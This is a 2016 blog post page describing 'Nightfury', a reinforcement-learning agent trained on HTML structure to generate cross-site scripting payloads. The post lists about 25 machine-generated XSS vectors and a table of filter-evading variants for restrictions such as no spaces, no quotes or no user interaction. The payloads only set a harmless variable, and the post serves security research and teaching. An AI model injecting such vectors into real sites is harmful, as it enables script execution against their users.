<!DOCTYPE html>
<html lang="en">
<head>
          <title>Teaching XSS to a machine</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta charset="utf-8" />
        <link href="https://tunnelshade.in/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="bharadwaj.machiraju Full Atom Feed" />


    <meta name="tags" content="tools" />


        <!-- CSS -->
        <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/pure-min.css" integrity="sha384-nn4HPE8lTHyVtfCBi5yW9d20FjT8BJwUXyWZT9InLYax14RDjBj46LmSztkmNP9w" crossorigin="anonymous">
        <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.0/build/grids-responsive-min.css" integrity="sha384-b92sF+wDNTHrfEtRaYo+EpcA8FUyHOSXrdxKc9XB9kaaX1rSQAgMevW6cYeE5Bdv" crossorigin="anonymous">
        <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
        <link rel="stylesheet" href="https://tunnelshade.in/theme/css/main.css">
        <!-- End CSS -->
  <link rel="stylesheet" href="https://tunnelshade.in/theme/css/blog.css">

        <!-- Google Analytics -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
       m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
         })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-40078808-2', 'tunnelshade.in');
  ga('send', 'pageview');
</script></head>

<body id="index" class="home">
  <br>
  <div class="pure-g">
    <div class="pure-u-2-24"></div>
    <div class="pure-u-20-24">
      <div class="pure-g">
        <div class="pure-u-md-20-24 pure-u-lg-20-24 pure-u-sm-24-24" style="display: flex; align-items: center;">
            <h1>
              <a href="https://tunnelshade.in/">bharadwaj.machiraju </a>   &raquo; <a href="https://tunnelshade.in/blog/index.html">Blog</a> <a href="https://tunnelshade.in/feeds/all.atom.xml"><i class="fa fa-rss"></i></a>
            </h1>
        </div>
        <div class="pure-u-md-4-24 pure-u-lg-4-24 pure-u-sm-0-24" style="display: flex; align-items: center;">
          <img class="logo" src="https://tunnelshade.in/theme/images/logo.png"/>
        </div>
      </div>
      <br>
      <hr>
      <br>
      <div class="pure-g">
  <div class="pure-g">
    <div class="pure-u-1 pure-u-md-4-5 pure-u-lg-4-5 pure-u-xl-4-5">
<section id="content" class="body">
  <header class="pure-g"><div class="pure-u-1">
    <h2 class="entry-title">
      <a href="https://tunnelshade.in/blog/2016/03/teaching-xss-to-machine/" rel="bookmark"
         title="Permalink to Teaching XSS to a machine">Teaching XSS to a machine</a></h2>
  </div></header>
  <footer class="pure-g"><div class="pure-u-1">

    <time class="published" datetime="2016-03-26T00:00:00+05:30">
      [26-03-16]
    </time>

    [<a href="/category/hacks/">Hacks</a>]

    [tools]

  </div></footer><!-- /.post-info -->
  <div class="pure-g"><div class="pure-u-1">
    <p>Even before we start anything, just have a glance at few interesting vectors that were dreamt by a machine learning agent which has structural
knowledge of HTML. Few vectors require user interaction also. I tried to add comments about what I think is special about few of those.</p>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onblur</span><span class="o">=</span><span class="s">x</span> <span class="na">onload</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span> <span class="na">onerror</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;&lt;</span><span class="nt">svg</span><span class="err">/</span><span class="na">onfocus</span><span class="o">=</span><span class="s">import</span><span class="p">&gt;</span>  <span class="c">&lt;!-- When the svg is clicked, the js fails and body onerror is triggered. WOW!! --&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#39;popup=1;&#39;</span><span class="na">onerror</span><span class="o">=</span><span class="s">popup=1;</span> <span class="na">onload</span><span class="o">=</span><span class="s">x</span> <span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">button</span> <span class="na">autofocus</span><span class="o">=</span><span class="s">x</span> <span class="na">onchange</span><span class="o">=</span><span class="s">&#39;import&#39;</span><span class="na">onfocus</span><span class="o">=</span><span class="s">popup=1;</span> <span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">button</span> <span class="na">data</span><span class="o">=</span><span class="s">popup=1;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;x&#39;</span><span class="na">onfocus</span><span class="o">=</span><span class="s">popup=1;</span> <span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">button</span> <span class="na">onclick</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">canvas</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&quot;popup=1;&quot;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">embed</span> <span class="na">onfocus</span><span class="o">=</span><span class="s">&#39;popup=1;&#39;</span><span class="p">&gt;&lt;</span><span class="nt">img</span>
<span class="err">&lt;</span><span class="na">form</span> <span class="na">formaction</span><span class="o">=</span><span class="s">popup=1;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;&lt;</span><span class="nt">object</span><span class="p">&gt;</span>  <span class="c">&lt;!-- Involves a click on object --&gt;</span>
<span class="p">&lt;</span><span class="nt">form</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;x&#39;</span><span class="na">onclick</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;&lt;</span><span class="nt">select</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">frameset</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;x&quot;</span><span class="na">onload</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">frameset</span> <span class="na">onload</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">onload</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">img</span> <span class="na">srcset</span><span class="o">=</span><span class="s">popup=1;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">onclick</span><span class="o">=</span><span class="s">popup=1;</span> <span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">onfocus</span><span class="o">=</span><span class="s">popup=1;</span> <span class="na">autofocus</span><span class="o">=</span><span class="s">&quot;x&quot;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">srcset</span><span class="o">=</span><span class="s">x</span> <span class="na">href</span><span class="o">=</span><span class="s">x</span> <span class="na">onclick</span><span class="o">=</span><span class="s">popup=1;</span> <span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">import</span> <span class="na">href</span><span class="o">=</span><span class="s">data:text/html;base64,PHNjcmlwdD5wb3B1cD0xOzwvc2NyaXB0Pg==</span><span class="p">&gt;</span>  <span class="c">&lt;!-- This is awesome --&gt;</span>
<span class="p">&lt;</span><span class="nt">object</span> <span class="na">onfocus</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">select</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&quot;popup=1;&quot;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">select</span> <span class="na">onclick</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">source</span> <span class="na">onclick</span><span class="o">=</span><span class="s">popup=1;</span> <span class="p">&gt;&lt;</span><span class="nt">frameset</span><span class="err">/</span><span class="na">onload</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;</span>  <span class="c">&lt;!-- Interesting as, agent was trying to find vector with no user interaction and only two allowed spaces in input --&gt;</span>
<span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onclick</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">video</span> <span class="na">onclick</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;</span>
</pre></div>


<h3>Introduction</h3>
<p>Let's talk about XSS first. How are you successful in creating a payload for demoing/exploiting a Cross Site Scripting vulnerability? It depends on your
ability to understand the HTML markup and inject a javascript statement in an executional context. If you think about it, your most basic payload starts from
<code>&lt;script&gt;alert(1);&lt;/script&gt;</code> to <code>&lt;img src=x onerror='alert()'&gt;</code>.</p>
<h3>Reinforcement Learning</h3>
<p>A branch of machine learning in which an agent learns optimum actions for different scenarios based on it's past experiences. A more elegant way of explaining
RL is taken from <a href="http://www.cse.unsw.edu.au/~cs9417ml/RL1/introduction.html">here</a></p>
<p>An RL agent learns by interacting with its environment and observing the results of these interactions. This mimics the fundamental way in which
humans (and animals alike) learn. As humans, we have a direct sensori-motor connection to our environment, meaning we can perform actions and witness
the results of these actions on the environment. The idea is commonly known as "cause and effect", and this undoubtedly is the key to building up
knowledge of our environment throughout our lifetime. The "cause and effect" idea can be translated into the following steps for an RL agent:</p>
<ul>
<li>The agent observes an input state</li>
<li>An action is determined by a decision making function (policy)</li>
<li>The action is performed</li>
<li>The agent receives a scalar reward or reinforcement from the environment</li>
<li>Information about the reward given for that state / action pair is recorded</li>
</ul>
<p>By performing actions, and obersving the resulting reward, the policy used to determine the best action for a state can be fine-tuned.
Eventually, if enough states are observed an optimal decision policy will be generated and we will have an agent that performs perfectly in
that particular environment.</p>
<h3>Idea</h3>
<p>Consider the following markup <code>&lt;div class="INJECTION_POINT"&gt;</code>. By a simple look you are aware that inorder to execute an XSS you come out of the
class attribute context and put a payload. A simple vector in the above scenario is <code>"&gt;&lt;img src=x onerror=alert()&gt;</code>. This is very trivial because
of your exposure to HTML markup, so I believed that if I can somehow impart the knowledge of html to an RL agent and let it play with it for few hours,
it should be able to provide some simple XSS payloads in different scenarios.</p>
<p>So, for the same scenario above, the RL agent get a state representation like</p>
<div class="highlight"><pre><span></span><span class="mi">1</span><span class="n">_tag</span><span class="o">:</span> <span class="n">div</span>
<span class="mi">1</span><span class="n">_tag_ap</span><span class="o">:</span> <span class="kd">class</span>
<span class="n">context</span><span class="o">:</span> <span class="n">attr_value</span>
<span class="n">context</span><span class="o">:</span> <span class="kd">class</span>
</pre></div>


<p>If the above state representation doesn't make any sense, just ignore it. All it does is try to represent the markup. Now, when I tried it against the
agent that I trained, I got the following payload</p>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">&gt;&lt;</span><span class="nt">button</span> <span class="na">onclick</span><span class="o">=</span><span class="s">popup=1;</span><span class="p">&gt;</span>
</pre></div>


<p>Not an optimized payload, as a matter of fact this infact requires user interaction. But this is a good starting point.</p>
<h3>Simplifications</h3>
<p>You can just give the set of alphabets and control characters (i.e ',",&lt;,&gt; etc.) as actions and the agent will learn valid HTML if you give negative reward
for all non valid markup that it generates. But for the agent to learn html huge training time is required. Similarly, there are other issues which I will not
go into detail but try to explain the simplifications I applied.</p>
<ul>
<li>To speedup the training time, instead of giving just alphabets I gave all the html tags, attributes as actions.</li>
<li>Based on the html parsing, html tags are made available only when the context is a tag name etc..</li>
<li>Similarly based on the html parsing attributes and their values are made available only when the context needs one of those.</li>
</ul>
<p>All the simplifications impart the knowledge of structure of html (XML like structure) only.</p>
<h3>Current State</h3>
<p>After training for about <strong>3 hours</strong> with <strong>25 html tags</strong> and <strong>25 attribute names</strong>, the agent aquires good level of knowledge. I provided the following injection
sink <code>&lt;button INJECTION_POINT</code>. Based on different restrictions the agent chooses different actions</p>
<p>| Conditions | Payload |
| No restrictions | <code>onclick=popup=1;&gt;</code> |
| No user interaction | <code>&gt;&lt;svg onload='popup=1;'&gt;</code> |
| No user interaction + No space | <code>&gt;&lt;iframe/onload='popup=1'&gt;</code> |
| No user interaction + No space + No Quotes | <code>&gt;&lt;iframe/onload=popup=1&gt;</code> |
| No user interaction + No 'onload' | <code>&gt;&lt;input autofocus='x' onfocus=popup=1;&gt;</code> |</p>
<h3>Future Work (Planned so far!)</h3>
<ul>
<li>Shift to a sparse sampling way to speed up learning.</li>
<li>If RlPy is not being suited, shift to <a href="http://deeplearning.net/software/theano/"><strong>Theano</strong></a> and use <a href="http://lasagne.readthedocs.org/en/latest/"><strong>Lasagne</strong></a>  for neural network to remember the value function.</li>
<li>A better state representation of only javascript might be interesting to try out. Why? Because AngularJS has a top notch sandbox to test against!!</li>
</ul>
<p>I am calling this project as <a href="https://github.com/tunnelshade/nightfury"><strong>Nightfury</strong></a> and planning to write a detailed technical blog post on how this has
been achieved so far. The github repo needs some cleanup, but as of now please bear with this!</p>
  </div></div><!-- /.entry-content -->
</section>

<div id="disqus_thread"></div>
<script>

/**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
/*
var disqus_config = function () {
this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
};
*/
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://tunnelshade.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>    </div>
    <div class="pure-u-1 pure-u-md-1-5 pure-u-lg-1-5 pure-u-xl-1-5 blog_sidebar">
      <strong>Categories</strong>
      <ul>
          <li><a href="/category/bugs/">Bugs</a> [6]</li>
          <li><a href="/category/hacks/">Hacks</a> [2]</li>
          <li><a href="/category/information/">Information</a> [5]</li>
          <li><a href="/category/linux/">Linux</a> [7]</li>
          <li><a href="/category/python/">Python</a> [4]</li>
          <li><a href="/category/tools/">Tools</a> [12]</li>
      </ul>

      <br>

      <strong>Tags</strong>
      <ul>
          <li><a href="/tag/reversing/">reversing</a> [5]</li>
          <li><a href="/tag/tools/">tools</a> [11]</li>
          <li><a href="/tag/fuzzing/">fuzzing</a> [3]</li>
          <li><a href="/tag/afl/">afl</a> [2]</li>
          <li><a href="/tag/tricks/">tricks</a> [11]</li>
          <li><a href="/tag/info/">info</a> [12]</li>
          <li><a href="/tag/python/">python</a> [3]</li>
          <li><a href="/tag/hacks/">hacks</a> [5]</li>
          <li><a href="/tag/conference/">conference</a> [2]</li>
          <li><a href="/tag/linux/">linux</a> [5]</li>
          <li><a href="/tag/owtf/">owtf</a> [3]</li>
          <li><a href="/tag/screenshots/">screenshots</a> [3]</li>
      </ul>

      <br>

      <strong>Author</strong>
<ul class="no_bullets">
    <li><a class="no_underline" href="https://twitter.com/tunnelshade_"><i class="fa fa-twitter"></i> @tunnelshade_</a></li>
    <li><a class="no_underline" href="https://github.com/tunnelshade"><i class="fa fa-github"></i> Github</a></li>
    <li><a class="no_underline" href="https://www.linkedin.com/in/tunnelshade/"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
    <li><a class="no_underline" href="domain_without_tld@gmail.com"><i class="fa fa-envelope"></i> domain_without_tld@gmail.com</a></li>
</ul>
    </div>
  </div>
      </div>
    </div>
    <div class="pure-u-2-24"></div>
  </div>
</body>
</html>